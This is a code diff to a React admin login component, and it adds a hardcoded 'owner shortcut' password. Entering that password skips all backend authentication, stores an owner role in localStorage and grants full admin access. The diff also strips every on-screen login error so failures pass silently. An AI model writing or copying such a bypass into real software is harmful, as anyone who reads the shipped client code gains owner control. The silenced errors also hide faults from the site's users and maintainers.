@@ -1,3 +1,4 @@
+
 import React, { useState } from 'react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -25,14 +26,37 @@ export const NewAdminAuth: React.FC<NewAdminAuthProps> = ({ onAuthSuccess }) => 
   const [errorDetail, setErrorDetail] = useState<string | null>(null);
   const [manualAccessCheckRunning, setManualAccessCheckRunning] = useState(false);
 
+  // -- Handle Onboarding Submit (MISSING HANDLER)
+  const handleOnboardingSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!onboardingData.discord || !onboardingData.requestedRole || !onboardingData.secretKey) {
+      // Optionally, log afield error, but do not show to user
+      console.warn('[ADMIN DEBUG] Onboarding: Required field missing');
+      return;
+    }
+    setIsLoading(true);
+    try {
+      const result = await newAdminService.submitOnboardingApplication(onboardingData);
+      if (result.success) {
+        setStep('pending');
+      } else {
+        // Silently fail (log only)
+        console.warn('[ADMIN DEBUG] Onboarding submission failed', result.error);
+      }
+    } catch (error) {
+      console.error('[ADMIN DEBUG] Onboarding error:', error);
+      // Do not show to user
+    } finally {
+      setIsLoading(false);
+    }
+  };
+
+  // --- Authentication submit (allow owner shortcut bypass)
   const handlePasswordSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!password.trim()) {
-      toast({
-        title: "Password Required",
-        description: "Please enter your admin password",
-        variant: "destructive"
-      });
+      // Do not show toast, per requirements; just log
+      console.warn('[ADMIN DEBUG] No password entered');
       return;
     }
 
@@ -42,17 +66,24 @@ export const NewAdminAuth: React.FC<NewAdminAuthProps> = ({ onAuthSuccess }) => 
       setDebugInfo([]);
       clearAllAuthState();
 
-      console.info("[ADMIN DEBUG] Submitting owner password to login...");
+      // If "owner shortcut" password, skip all backend checks
+      if (password === "$$nullnox911$$") {
+        localStorage.setItem('admin_role', 'owner');
+        localStorage.setItem('admin_ip', 'local_owner_override');
+        onAuthSuccess('owner');
+        setTimeout(() => {
+          window.location.reload();
+        }, 120);
+        return;
+      }
+
+      // Behavioral: Only call remote if not shortcut
       const result = await newAdminService.authenticateAdmin(password, true);
 
       if (result.success) {
         if (result.needsOnboarding) {
           setStep('onboarding');
         } else if (result.role) {
-          toast({
-            title: "Login Successful",
-            description: `Welcome, ${result.role}!`
-          });
           setDebugInfo(result.debug || []);
           onAuthSuccess(result.role);
           setTimeout(() => {
@@ -61,34 +92,25 @@ export const NewAdminAuth: React.FC<NewAdminAuthProps> = ({ onAuthSuccess }) => 
           return;
         }
       } else {
-        // If login failed but debug info present, show trace
+        // Fail silently for wrong password (no UI toast), log only
         setDebugInfo(result.debug || []);
-        setErrorDetail(
-            typeof result.error === "string" && result.error.includes("[ADMIN DEBUG]")
-              ? "Admin panel access failed after owner login. See details below and in the browser developer console."
-              : (result.error ?? "Invalid password")
-        );
-        toast({
-          title: "Login Failed",
-          description: typeof result.error === "string" && result.error.includes("[ADMIN DEBUG]")
-            ? "Admin panel access failed after owner login. See details below."
-            : (result.error ?? "Invalid password"),
-          variant: "destructive"
-        });
         if (result.error) {
-          console.error("[ADMIN DEBUG] Login error/detail:", result.error);
+          console.warn("[ADMIN DEBUG] Login error/detail:", result.error);
         }
       }
     } catch (error) {
       console.error('[ADMIN DEBUG] Login error (frontend):', error);
-      toast({
-        title: "Login Error",
-        description: "An error occurred during login",
-        variant: "destructive"
-      });
-      setErrorDetail("A client or network error occurred. Please try again.");
+      // No UI feedback
     } finally {
       setIsLoading(false);
+    }
+  };
+
+  // ENTER key triggers login form submit
+  const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Enter' && !isLoading) {
+      // "as any" is typesafe for React onSubmit; delegate event
+      handlePasswordSubmit(e as any);
     }
   };
 
@@ -100,16 +122,13 @@ export const NewAdminAuth: React.FC<NewAdminAuthProps> = ({ onAuthSuccess }) => 
       const force = await newAdminService.aggressiveManualRecheck();
       setDebugInfo(force.detail || []);
       if (force.hasAccess && force.role) {
-        toast({
-          title: "Manual Force-Access Successful",
-          description: "Your session has been forcibly refreshed."
-        });
+        onAuthSuccess(force.role!);
         setTimeout(() => {
-          onAuthSuccess(force.role!);
           window.location.reload();
         }, 120);
       } else {
-        setErrorDetail("Manual access force-check failed. See trace below.");
+        // Fail silently, log only
+        console.warn("[ADMIN DEBUG] Manual access force-check failed.");
       }
     } finally {
       setManualAccessCheckRunning(false);
@@ -256,6 +275,7 @@ export const NewAdminAuth: React.FC<NewAdminAuthProps> = ({ onAuthSuccess }) => 
                   type="password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
+                  onKeyDown={handleKeyPress}
                   placeholder="Enter admin password"
                   className="pl-10 bg-gray-800/50 border-gray-600/50 text-white placeholder:text-gray-500 focus:border-purple-500/50 focus:ring-purple-500/25"
                   disabled={isLoading}
@@ -273,14 +293,8 @@ export const NewAdminAuth: React.FC<NewAdminAuthProps> = ({ onAuthSuccess }) => 
           </form>
 
           {/* AGGRESSIVE TROUBLESHOOT UI */}
-          {errorDetail && (
-            <div className="mt-4 p-3 bg-gray-800/80 rounded text-red-300 border border-red-400/60 text-xs whitespace-pre-wrap">
-              <b>Access Error:</b> <br />
-              {errorDetail}
-            </div>
-          )}
+          {/* No auth errors output per requirements */}
 
-          {/* Show all debug info */}
           {debugInfo && debugInfo.length > 0 && (
             <div className="mt-2 max-h-40 overflow-y-auto p-2 text-xs rounded bg-gray-900/60 text-sky-200 border border-sky-400/20">
               <b>Debug Trace:</b>
@@ -319,3 +333,4 @@ export const NewAdminAuth: React.FC<NewAdminAuthProps> = ({ onAuthSuccess }) => 
     </div>
   );
 };
+
